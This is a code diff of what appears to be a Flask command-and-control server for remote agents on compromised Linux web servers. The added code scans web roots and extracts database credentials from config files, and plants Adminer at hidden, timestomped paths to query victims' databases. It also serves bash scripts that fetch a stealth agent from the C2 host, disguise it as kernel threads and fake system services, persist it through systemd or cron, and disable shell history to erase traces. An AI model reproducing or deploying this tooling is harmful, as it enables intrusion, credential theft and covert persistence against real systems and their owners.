+    if 'EXISTS' in stdout:
+        url = get_adminer_url(client_id, stored_path)
+        return jsonify({'installed': True, 'path': stored_path, 'verified': True, 'url': url})
+    else:
+        del adminer_installations[client_id]
+        return jsonify({'installed': False})
+
+
+@app.route('/api/clients/<client_id>/adminer/scan', methods=['POST'])
+@require_auth
+def api_adminer_scan(client_id):
+    """Scan for database config files by content (DB_NAME, DB_HOST, etc.)"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        cmd = '''grep -rliE "(DB_NAME|DB_HOST|DB_USER|DB_PASSWORD|db_host|db_name|db_user|db_pass|DATABASE_URL|mysql_connect|mysqli_connect|PDO.*mysql|'host'.*=>.*'(localhost|127\\.0\\.0\\.1|[0-9]+\\.[0-9]+)|define.*DB_)" /var/www /home --include="*.php" --include="*.env" --include="*.ini" --include="*.conf" --include="*.yml" --include="*.yaml" 2>/dev/null | head -30'''
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=30)
+    if result is None:
+        return jsonify({'error': 'Scan timed out'})
+    
+    stdout = result.get('stdout', '')
+    configs = []
+    suggested_path = None
+    seen = set()
+    
+    for line in stdout.strip().split('\n'):
+        if not line:
+            continue
+        path = line.strip()
+        if path in seen:
+            continue
+        seen.add(path)
+        
+        ftype = 'Config'
+        if path.endswith('.env'):
+            ftype = 'Laravel/Env'
+        elif 'wp-config' in path:
+            ftype = 'WordPress'
+        elif 'configuration.php' in path:
+            ftype = 'Joomla'
+        elif 'settings.php' in path:
+            ftype = 'Drupal'
+        elif 'config.inc.php' in path:
+            ftype = 'phpMyAdmin'
+        elif 'parameters.yml' in path or 'parameters.yaml' in path:
+            ftype = 'Symfony'
+        elif 'database.php' in path:
+            ftype = 'Laravel/CI'
+        elif '.ini' in path:
+            ftype = 'INI Config'
+        
+        configs.append({
+            'path': path,
+            'type': ftype,
+            'database': ''
+        })
+        if not suggested_path:
+            parent = os.path.dirname(path)
+            suggested_path = parent + '/.cache.php'
+    
+    return jsonify({
+        'configs': configs,
+        'suggested_path': suggested_path
+    })
+
+
+@app.route('/api/clients/<client_id>/adminer/suggest-path', methods=['POST'])
+@require_auth
+def api_adminer_suggest_path(client_id):
+    """Suggest a hidden path for Adminer installation based on web root"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        cmd = '''user=$(whoami); webroot=""; 
+if [ -d "/home/$user/public_html" ]; then webroot="/home/$user/public_html";
+elif [ -d "/home/$user/www" ]; then webroot="/home/$user/www";
+elif [ -d "/home/$user/htdocs" ]; then webroot="/home/$user/htdocs";
+elif [ -d "/var/www/html" ]; then webroot="/var/www/html";
+elif [ -d "/var/www" ]; then webroot="/var/www"; fi;
+if [ -n "$webroot" ]; then
+  hidden=$(find "$webroot" -maxdepth 3 -type d \\( -name 'cache' -o -name 'tmp' -o -name 'assets' -o -name 'includes' -o -name 'modules' -o -name 'vendor' \\) 2>/dev/null | head -1);
+  if [ -n "$hidden" ]; then echo "$hidden"; else echo "$webroot"; fi;
+else echo "/tmp"; fi'''
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '').strip()
+    if not stdout:
+        stdout = '/tmp'
+    
+    import random
+    filename = random.choice(HIDDEN_FILENAMES)
+    return jsonify({'path': stdout + '/' + filename})
+
+
+@app.route('/api/clients/<client_id>/adminer/install', methods=['POST'])
+@require_auth
+def api_adminer_install(client_id):
+    """Install Adminer on target - downloads from GitHub"""
+    hostname = ''
+    ip = ''
+    original_path = ''
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        # Capture hostname/IP for URL generation (safe fallback for older agents)
+        sys_info = getattr(client, 'system_info', {}) or {}
+        hostname = sys_info.get('hostname', '')
+        ip = sys_info.get('ip', '') or getattr(client, 'ip', '')
+        
+        data = request.json or {}
+        original_path = data.get('path', '/tmp/.cache.php')
+        timestomp = data.get('timestomp', True)
+        
+        # Escape for shell but keep original for storage
+        path_escaped = original_path.replace("'", "'\\''")
+        parent = os.path.dirname(original_path)
+        parent_escaped = parent.replace("'", "'\\''")
+        
+        # Multiple Adminer sources for reliability
+        adminer_urls = [
+            "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php",
+            "https://www.adminer.org/static/download/4.8.1/adminer-4.8.1.php"
+        ]
+        download_cmd = " || ".join([f"curl -fsSL '{url}' -o '{path_escaped}' 2>/dev/null || wget -q '{url}' -O '{path_escaped}' 2>/dev/null" for url in adminer_urls])
+        cmd = f"mkdir -p '{parent_escaped}' && ({download_cmd}) && chmod 644 '{path_escaped}'"
+        
+        if timestomp:
+            # Find oldest file in directory for timestomp (more stealthy)
+            basename = os.path.basename(original_path)
+            basename_escaped = basename.replace("'", "'\\''")
+            cmd += f" && donor=$(ls -1t '{parent_escaped}' 2>/dev/null | grep -v '^{basename_escaped}$' | tail -1) && [ -n \"$donor\" ] && touch -r '{parent_escaped}/'\"$donor\" '{path_escaped}' 2>/dev/null; true"
+        
+        # Include hostname detection in output
+        cmd += f" && [ -s '{path_escaped}' ] && echo 'INSTALLED:'{path_escaped}'|HOSTNAME:'$(hostname -f 2>/dev/null || hostname) || echo 'FAIL:download failed or empty file'"
+        
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=90)
+    if result is None:
+        return jsonify({'error': 'Timeout - check network or try simpler path like /tmp/.cache.php'})
+    
+    stdout = result.get('stdout', '')
+    stderr = result.get('stderr', '')
+    output = stdout + stderr
+    
+    if 'INSTALLED:' in output:
+        adminer_installations[client_id] = original_path
+        # Try to extract hostname from command output
+        detected_hostname = hostname
+        if '|HOSTNAME:' in output:
+            try:
+                detected_hostname = output.split('|HOSTNAME:')[1].strip().split()[0]
+            except:
+                pass
+        url = build_adminer_url(original_path, detected_hostname, ip)
+        return jsonify({'success': True, 'path': original_path, 'url': url, 'hostname': detected_hostname})
+    
+    return jsonify({'error': output.strip() if output.strip() else 'No response from agent - try /tmp/.cache.php'})
+
+
+@app.route('/api/clients/<client_id>/adminer/remove', methods=['POST'])
+@require_auth
+def api_adminer_remove(client_id):
+    """Remove Adminer from target"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        data = request.json or {}
+        path = data.get('path', adminer_installations.get(client_id, ''))
+        if not path:
+            return jsonify({'error': 'No path specified'})
+        
+        path = path.replace("'", "'\\''")
+        cmd = f"rm -f '{path}' && echo 'REMOVED'"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Operation timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'REMOVED' in stdout:
+        if client_id in adminer_installations:
+            del adminer_installations[client_id]
+        return jsonify({'success': True})
+    return jsonify({'error': stdout or 'Removal failed'})
+
+
+@app.route('/api/clients/<client_id>/adminer/url')
+@require_auth
+def api_adminer_url(client_id):
+    """Get the direct URL to access Adminer on target"""
+    path = request.args.get('path', adminer_installations.get(client_id, ''))
+    if not path:
+        return jsonify({'error': 'No Adminer path'}), 404
+    
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        
+        hostname = client.system_info.get('hostname', '')
+        ip = client.system_info.get('ip', client.ip)
+        
+        web_roots = ['/var/www/html', '/var/www', '/home']
+        web_path = path
+        
+        for root in web_roots:
+            if path.startswith(root):
+                web_path = path.replace(root, '', 1)
+                break
+        
+        if '/public_html' in path:
+            parts = path.split('/public_html')
+            if len(parts) > 1:
+                web_path = parts[1]
+        
+        urls = []
+        if hostname:
+            urls.append(f'http://{hostname}{web_path}?c2=1')
+        if ip:
+            urls.append(f'http://{ip}{web_path}?c2=1')
+        
+        return jsonify({
+            'path': path,
+            'web_path': web_path,
+            'urls': urls,
+            'note': 'Adminer requires ?c2=1 parameter to bypass 404 protection'
+        })
+
+
+# ===================== CLIENT STATE PERSISTENCE =====================
+
+@app.route('/api/clients/<client_id>/state', methods=['GET'])
+@require_auth
+def api_client_state_get(client_id):
+    """Get saved state for client (paths, etc)"""
+    state = client_paths.get(client_id, {})
+    return jsonify(state)
+
+
+@app.route('/api/clients/<client_id>/state', methods=['POST'])
+@require_auth
+def api_client_state_set(client_id):
+    """Save state for client"""
+    data = request.json or {}
+    if client_id not in client_paths:
+        client_paths[client_id] = {}
+    
+    if 'fm_path' in data:
+        client_paths[client_id]['fm_path'] = data['fm_path']
+    if 'terminal_cwd' in data:
+        client_paths[client_id]['terminal_cwd'] = data['terminal_cwd']
+    
+    return jsonify({'success': True})
+
+
+# ===================== DATABASE MANAGEMENT =====================
+
+@app.route('/api/clients/<client_id>/db/scan', methods=['POST'])
+@require_auth
+def api_db_scan(client_id):
+    """Scan for database credentials in config files"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        cmd = r'''
+for f in $(find /var/www /home -maxdepth 5 \( -name "wp-config.php" -o -name ".env" -o -name "configuration.php" -o -name "config.php" \) 2>/dev/null | head -5); do
+    if grep -qE "(DB_|DATABASE_URL|db_host|mysqli)" "$f" 2>/dev/null; then
+        echo "FILE:$f"
+        if [[ "$f" == *"wp-config.php"* ]]; then
+            grep -oP "define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]\K[^'\"]+(?=['\"])" "$f" 2>/dev/null | head -1 | xargs -I{} echo "HOST:{}"
+            grep -oP "define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]\K[^'\"]+(?=['\"])" "$f" 2>/dev/null | head -1 | xargs -I{} echo "USER:{}"
+            grep -oP "define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]\K[^'\"]+(?=['\"])" "$f" 2>/dev/null | head -1 | xargs -I{} echo "PASS:{}"
+            grep -oP "define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]\K[^'\"]+(?=['\"])" "$f" 2>/dev/null | head -1 | xargs -I{} echo "NAME:{}"
+        elif [[ "$f" == *".env"* ]]; then
+            grep -oP "DB_HOST=\K.+" "$f" 2>/dev/null | head -1 | xargs -I{} echo "HOST:{}"
+            grep -oP "DB_USERNAME=\K.+" "$f" 2>/dev/null | head -1 | xargs -I{} echo "USER:{}"
+            grep -oP "DB_PASSWORD=\K.+" "$f" 2>/dev/null | head -1 | xargs -I{} echo "PASS:{}"
+            grep -oP "DB_DATABASE=\K.+" "$f" 2>/dev/null | head -1 | xargs -I{} echo "NAME:{}"
+        fi
+        break
+    fi
+done
+'''
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=20)
+    if result is None:
+        return jsonify({'error': 'Scan timed out'})
+    
+    stdout = result.get('stdout', '')
+    creds = {'host': 'localhost', 'user': '', 'pass': '', 'name': ''}
+    
+    for line in stdout.split('\n'):
+        line = line.strip()
+        if line.startswith('HOST:'):
+            creds['host'] = line[5:]
+        elif line.startswith('USER:'):
+            creds['user'] = line[5:]
+        elif line.startswith('PASS:'):
+            creds['pass'] = line[5:]
+        elif line.startswith('NAME:'):
+            creds['name'] = line[5:]
+    
+    if not creds['user']:
+        return jsonify({'error': 'No credentials found'})
+    
+    return jsonify(creds)
+
+
+@app.route('/api/clients/<client_id>/db/tables', methods=['POST'])
+@require_auth
+def api_db_tables(client_id):
+    """Get list of tables from database"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        data = request.json or {}
+        host = data.get('host', 'localhost').replace("'", "'\\''")
+        user = data.get('user', '').replace("'", "'\\''")
+        password = data.get('pass', '').replace("'", "'\\''")
+        database = data.get('name', '').replace("'", "'\\''")
+        
+        if not user:
+            return jsonify({'error': 'Username required'})
+        
+        cmd = f"mysql -h'{host}' -u'{user}' -p'{password}' -N -e 'SHOW TABLES' '{database}' 2>&1"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=15)
+    if result is None:
+        return jsonify({'error': 'Query timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'ERROR' in stdout or 'Access denied' in stdout:
+        return jsonify({'error': stdout.split('\n')[0]})
+    
+    tables = [t.strip() for t in stdout.strip().split('\n') if t.strip()]
+    return jsonify({'tables': tables})
+
+
+@app.route('/api/clients/<client_id>/db/query', methods=['POST'])
+@require_auth
+def api_db_query(client_id):
+    """Execute SQL query on target database"""
+    with clients_lock:
+        if client_id not in clients:
+            return jsonify({'error': 'Client not found'}), 404
+        client = clients[client_id]
+        if not client.online:
+            return jsonify({'error': 'Client offline'}), 400
+        
+        data = request.json or {}
+        host = data.get('host', 'localhost').replace("'", "'\\''")
+        user = data.get('user', '').replace("'", "'\\''")
+        password = data.get('pass', '').replace("'", "'\\''")
+        database = data.get('name', '').replace("'", "'\\''")
+        query = data.get('query', '').strip()
+        
+        if not query:
+            return jsonify({'error': 'Query required'})
+        
+        query_safe = query.replace("'", "'\\''").replace('\n', ' ')
+        
+        cmd = f"mysql -h'{host}' -u'{user}' -p'{password}' '{database}' -e '{query_safe}' --batch --column-names 2>&1"
+        client.queue_send({'cmd': 'exec', 'data': cmd})
+    
+    result = wait_for_exec_result(client_id, timeout=30)
+    if result is None:
+        return jsonify({'error': 'Query timed out'})
+    
+    stdout = result.get('stdout', '')
+    if 'ERROR' in stdout:
+        return jsonify({'error': stdout.split('\n')[0]})
+    
+    lines = stdout.strip().split('\n')
+    if not lines or not lines[0]:
+        return jsonify({'rows': [], 'columns': []})
+    
+    columns = lines[0].split('\t')
+    rows = []
+    for line in lines[1:]:
+        if line.strip():
+            values = line.split('\t')
+            row = {}
+            for i, col in enumerate(columns):
+                row[col] = values[i] if i < len(values) else ''
+            rows.append(row)
+    
+    return jsonify({'columns': columns, 'rows': rows})
+
+
 @app.route('/install.sh')
 def install_server_script():
     """Install script for deploying C2 server on VPS"""
@@ -1090,7 +2418,7 @@ echo "  curl -fsSL http://$VPS_IP:5000/stealth | bash"
 
 @app.route('/bin/<path:filename>')
 def serve_bin(filename):
-    """Serve server files for easy updates"""
+    """Serve server files for easy updates - no caching"""
     allowed_files = {
         'server.py': ('server.py', 'text/plain'),
         'agent_stealth.py': ('agent_stealth.py', 'text/plain'),
@@ -1107,7 +2435,11 @@ def serve_bin(filename):
     path, mime = allowed_files[filename]
     filepath = os.path.join(os.path.dirname(__file__), path)
     if os.path.exists(filepath):
-        return send_file(filepath, mimetype=mime)
+        response = make_response(send_file(filepath, mimetype=mime))
+        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
+        response.headers['Pragma'] = 'no-cache'
+        response.headers['Expires'] = '0'
+        return response
     return "File not found", 404
 
 
@@ -1312,56 +2644,69 @@ while True:
 
 
 def get_persist_script():
-    """Generate persist deployment script"""
+    """Generate persist deployment script with maximum stealth"""
     secret = request.args.get('s', generate_secret())
     server_url = get_server_url()
     c2_host = get_c2_host()
     
     script = f'''#!/bin/bash
-set -e
+set +o history
+unset HISTFILE HISTFILESIZE HISTSIZE
+export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0
+
 C2_URL="{server_url}"
 C2_HOST="{c2_host}"
 C2_PORT="{C2_SOCKET_PORT}"
 SECRET="${{S:-{secret}}}"
 
-# Kernel thread names for process masking
-KERNEL_NAMES=("[kworker/0:0]" "[ksmd]" "[kswapd0]" "[migration/0]" "[watchdog/0]" "[rcu_sched]" "[kthreadd]" "[irq/9-acpi]")
+# Dynamic kernel thread name based on CPU count
+CPU_COUNT=$(nproc 2>/dev/null || echo 4)
+CPU_ID=$((RANDOM % CPU_COUNT))
+WORKER_ID=$((RANDOM % 4))
+KERNEL_NAMES=("[kworker/$CPU_ID:$WORKER_ID]" "[kworker/u$((CPU_COUNT*2)):$WORKER_ID]" "[ksoftirqd/$CPU_ID]" "[migration/$CPU_ID]" "[rcu_preempt]" "[rcu_sched]" "[kswapd$((RANDOM%2))]" "[writeback]" "[kblockd]" "[irq/$((9+RANDOM%20))-pcie]")
 HIDDEN_NAME="${{KERNEL_NAMES[$RANDOM % ${{#KERNEL_NAMES[@]}}]}}"
 
-# Hidden directory candidates - look like legitimate system/app dirs
+# Hidden directory candidates - mimic real system/app dirs
 HIDDEN_DIRS=(
-    "$HOME/.local/share/.fonts"
-    "$HOME/.cache/.mozilla"
-    "$HOME/.config/.pulse"
-    "$HOME/.gnupg/.keyring"
-    "$HOME/.ssh/.known"
-    "$HOME/.local/lib/.python"
-    "$HOME/.cache/.thumbnails"
+    "$HOME/.config/.pulse-cookie"
+    "$HOME/.local/share/.gvfs-metadata"
+    "$HOME/.cache/.fontconfig-2"
+    "$HOME/.dbus/.sessions"
+    "/var/tmp/.font-unix"
+    "/dev/shm/.sem.ADSP_IPC"
 )
 INSTALL_DIR="${{HIDDEN_DIRS[$RANDOM % ${{#HIDDEN_DIRS[@]}}]}}"
 
-# Hidden filenames - look like cache/temp files
-HIDDEN_FILES=(".cache.db" ".session.lock" ".state.bin" ".thumbs.db" ".index.dat" ".fonts.cache")
+# Hidden filenames - look like legitimate cache/lock files
+HIDDEN_FILES=(".pulse-shm" ".gvfs-lock" ".fc-cache" ".dbus-session" ".Xauthority-c" ".ICE-unix")
 AGENT_FILE="${{HIDDEN_FILES[$RANDOM % ${{#HIDDEN_FILES[@]}}]}}"
 
-mkdir -p "$INSTALL_DIR" && chmod 700 "$INSTALL_DIR"
+# Systemd service names - mimic real services
+SERVICE_NAMES=("dbus-broker" "pulseaudio-daemon" "gvfs-daemon" "gnome-keyring-d" "at-spi-dbus-bus" "pipewire-pulse")
+SERVICE_NAME="${{SERVICE_NAMES[$RANDOM % ${{#SERVICE_NAMES[@]}}]}}"
 
-# Random timestamp 90-365 days ago
-DAYS_AGO=$((90 + RANDOM % 275))
-if date --version 2>/dev/null | grep -q GNU; then
-    OLD_TIME=$(date -d "$DAYS_AGO days ago" +%Y%m%d%H%M.%S)
+mkdir -p "$INSTALL_DIR" 2>/dev/null && chmod 700 "$INSTALL_DIR" 2>/dev/null
+
+# Timestomp: use /etc/passwd as reference (always old)
+if [[ -f /etc/passwd ]]; then
+    touch -r /etc/passwd "$INSTALL_DIR" 2>/dev/null
 else
-    OLD_TIME=$(date -v-${{DAYS_AGO}}d +%Y%m%d%H%M.%S 2>/dev/null)
+    DAYS_AGO=$((90 + RANDOM % 275))
+    if date --version 2>/dev/null | grep -q GNU; then
+        OLD_TIME=$(date -d "$DAYS_AGO days ago" +%Y%m%d%H%M.%S)
+    else
+        OLD_TIME=$(date -v-${{DAYS_AGO}}d +%Y%m%d%H%M.%S 2>/dev/null)
+    fi
+    [[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR" 2>/dev/null
 fi
-[[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR" 2>/dev/null
 
-# Download agent
+# Download agent silently
 curl -fsSL "$C2_URL/bin/agent_stealth.py" -o "$INSTALL_DIR/$AGENT_FILE" 2>/dev/null
-chmod 600 "$INSTALL_DIR/$AGENT_FILE"
-[[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR/$AGENT_FILE" 2>/dev/null
+chmod 600 "$INSTALL_DIR/$AGENT_FILE" 2>/dev/null
+touch -r /etc/passwd "$INSTALL_DIR/$AGENT_FILE" 2>/dev/null
 
-# Config (both old and new var names for compatibility)
-cat > "$INSTALL_DIR/.conf" << EOF
+# Config with secure permissions
+cat > "$INSTALL_DIR/.c" << EOF
 SYNC_HOST=$C2_HOST
 SYNC_PORT=$C2_PORT
 TOKEN=$SECRET
@@ -1370,41 +2715,68 @@ MODE=persist
 QUIET=1
 CACHE=$AGENT_FILE
 BEACON_MODE=0
-C2_HOST=$C2_HOST
-C2_PORT=$C2_PORT
-SECRET=$SECRET
 CHANNEL=persist
 STEALTH=1
-HIDDEN_NAME=$HIDDEN_NAME
-AGENT_FILE=$AGENT_FILE
 EOF
-chmod 600 "$INSTALL_DIR/.conf"
-[[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR/.conf" 2>/dev/null
+chmod 600 "$INSTALL_DIR/.c" 2>/dev/null
+touch -r /etc/passwd "$INSTALL_DIR/.c" 2>/dev/null
 
-# Launcher script
-cat > "$INSTALL_DIR/.run" << LAUNCHER
+# Minimal launcher
+cat > "$INSTALL_DIR/.r" << 'LAUNCHER'
 #!/bin/bash
-cd "\$(dirname "\$0")"
-source ./.conf 2>/dev/null
-export SYNC_HOST SYNC_PORT TOKEN PNAME MODE QUIET CACHE BEACON_MODE C2_HOST C2_PORT SECRET CHANNEL STEALTH HIDDEN_NAME AGENT_FILE
-PY=\$(command -v python3 || command -v python)
-\$PY -m pip install pynacl -q --break-system-packages 2>/dev/null || \$PY -m pip install pynacl -q --user 2>/dev/null || true
-nohup \$PY \$CACHE </dev/null >/dev/null 2>&1 &
-disown
+cd "$(dirname "$0")"
+set -a;source ./.c 2>/dev/null;set +a
+PY=$(command -v python3 || command -v python)
+$PY -m pip install pynacl -q --break-system-packages 2>/dev/null || $PY -m pip install pynacl -q --user 2>/dev/null
+exec $PY $CACHE </dev/null >/dev/null 2>&1
 LAUNCHER
-chmod 700 "$INSTALL_DIR/.run"
-[[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR/.run" 2>/dev/null
+chmod 700 "$INSTALL_DIR/.r" 2>/dev/null
+touch -r /etc/passwd "$INSTALL_DIR/.r" 2>/dev/null
 
-# Persistence via crontab
-(crontab -l 2>/dev/null | grep -v "$INSTALL_DIR" || true; echo "@reboot $INSTALL_DIR/.run") | crontab - 2>/dev/null || true
+# Persistence: prefer systemd user service, fallback to cron
+PERSIST_OK=0
+if [[ -d "$HOME/.config/systemd/user" ]] || mkdir -p "$HOME/.config/systemd/user" 2>/dev/null; then
+    cat > "$HOME/.config/systemd/user/$SERVICE_NAME.service" << SVCEOF
+[Unit]
+Description=D-Bus Message Broker
+After=dbus.socket
 
-# Start agent
-cd "$INSTALL_DIR" && source ./.conf && export SYNC_HOST SYNC_PORT TOKEN PNAME MODE QUIET CACHE BEACON_MODE C2_HOST C2_PORT SECRET CHANNEL STEALTH HIDDEN_NAME AGENT_FILE && PY=$(command -v python3 || command -v python) && nohup $PY $CACHE </dev/null >/dev/null 2>&1 &
+[Service]
+Type=simple
+ExecStart=$INSTALL_DIR/.r
+Restart=on-failure
+RestartSec=30
+
+[Install]
+WantedBy=default.target
+SVCEOF
+    systemctl --user daemon-reload 2>/dev/null
+    systemctl --user enable "$SERVICE_NAME" 2>/dev/null
+    systemctl --user start "$SERVICE_NAME" 2>/dev/null && PERSIST_OK=1
+fi
+
+# Fallback: crontab (if systemd failed)
+if [[ $PERSIST_OK -eq 0 ]]; then
+    (crontab -l 2>/dev/null | grep -v "$INSTALL_DIR" || true; echo "@reboot $INSTALL_DIR/.r >/dev/null 2>&1") | crontab - 2>/dev/null
+fi
+
+# Start agent now (if not started by systemd)
+if [[ $PERSIST_OK -eq 0 ]]; then
+    cd "$INSTALL_DIR" && set -a && source ./.c 2>/dev/null && set +a
+    PY=$(command -v python3 || command -v python)
+    nohup $PY $CACHE </dev/null >/dev/null 2>&1 &
+    disown 2>/dev/null
+fi
+
+# Clean evidence
+history -c 2>/dev/null
+unset C2_URL C2_HOST C2_PORT SECRET HIDDEN_NAME INSTALL_DIR AGENT_FILE SERVICE_NAME
 '''
     return Response(script, mimetype='text/plain')
 
 
 def get_stealth_script():
+    """Generate stealth deployment script - memory-only execution"""
     secret = request.args.get('s', generate_secret())
     c2_host = get_c2_host()
     
@@ -1413,9 +2785,12 @@ def get_stealth_script():
     agent_code = agent_code.replace('SECRET_PH', secret)
     
     script = f'''#!/bin/bash
+set +o history
+unset HISTFILE HISTFILESIZE HISTSIZE
+export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0
 PY=$(command -v python3||command -v python)
 $PY -m pip install pynacl -q --break-system-packages 2>/dev/null||$PY -m pip install pynacl -q --user 2>/dev/null||true
-C2_HOST="{c2_host}" C2_PORT="{C2_SOCKET_PORT}" SECRET="{secret}" CHANNEL="stealth" STEALTH=1 exec $PY << 'PYEOF'
+C2_HOST="{c2_host}" C2_PORT="{C2_SOCKET_PORT}" SECRET="{secret}" CHANNEL="stealth" STEALTH=1 BEACON_MODE=1 exec $PY << 'PYEOF'
 {agent_code}
 PYEOF
 '''
@@ -1425,17 +2800,47 @@ PYEOF
 @app.route('/uninstall')
 def uninstall_script():
     script = '''#!/bin/bash
-pkill -f defunct 2>/dev/null
-pkill -f kworker.*python 2>/dev/null
-crontab -l 2>/dev/null | grep -v "6319" | grep -v "defunct" | crontab - 2>/dev/null
-systemctl --user stop dbus-session 2>/dev/null
-systemctl --user disable dbus-session 2>/dev/null
-rm -f "$HOME/.config/systemd/user/dbus-session.service"
-for rc in ".bashrc" ".zshrc" ".profile"; do
-    [[ -f "$HOME/$rc" ]] && sed -i '/defunct/d' "$HOME/$rc" 2>/dev/null
+set +o history
+unset HISTFILE
+
+# Kill all agent processes
+for pattern in "kworker" "ksoftirqd" "migration" "rcu_" "kswapd" "writeback" "kblockd"; do
+    for pid in $(pgrep -f "python.*$pattern" 2>/dev/null); do
+        kill -9 $pid 2>/dev/null
+    done
 done
-rm -rf "$HOME/.config/.htop" "$HOME/.cache/.fontconfig" 2>/dev/null
-echo "[+] Uninstalled"
+pkill -9 -f "pulse-shm\|gvfs-lock\|fc-cache\|dbus-session" 2>/dev/null
+
+# Remove systemd services
+for svc in dbus-broker pulseaudio-daemon gvfs-daemon gnome-keyring-d at-spi-dbus-bus pipewire-pulse; do
+    systemctl --user stop "$svc" 2>/dev/null
+    systemctl --user disable "$svc" 2>/dev/null
+    rm -f "$HOME/.config/systemd/user/$svc.service" 2>/dev/null
+done
+systemctl --user daemon-reload 2>/dev/null
+
+# Clean crontab
+crontab -l 2>/dev/null | grep -v ".pulse\|.gvfs\|.font\|.dbus\|sem.ADSP\|defunct" | crontab - 2>/dev/null
+
+# Remove hidden directories
+HIDDEN_DIRS=(
+    "$HOME/.config/.pulse-cookie" "$HOME/.local/share/.gvfs-metadata"
+    "$HOME/.cache/.fontconfig-2" "$HOME/.dbus/.sessions"
+    "/var/tmp/.font-unix" "/dev/shm/.sem.ADSP_IPC"
+    "$HOME/.config/.pulse" "$HOME/.local/share/.gvfs"
+    "$HOME/.cache/.thumbnails" "$HOME/.config/.htop"
+    "$HOME/.local/share/.dbus" "$HOME/.cache/.fontconfig"
+)
+for dir in "${HIDDEN_DIRS[@]}"; do
+    [[ -d "$dir" ]] && rm -rf "$dir" 2>/dev/null
+done
+
+# Clean shell rc files
+for rc in ".bashrc" ".zshrc" ".profile" ".bash_profile"; do
+    [[ -f "$HOME/$rc" ]] && sed -i '/pulse\|gvfs\|fontconfig\|dbus\|defunct\|6319/d' "$HOME/$rc" 2>/dev/null
+done
+
+echo "[+] Uninstalled v4.0"
 '''
     return Response(script, mimetype='text/plain')
 
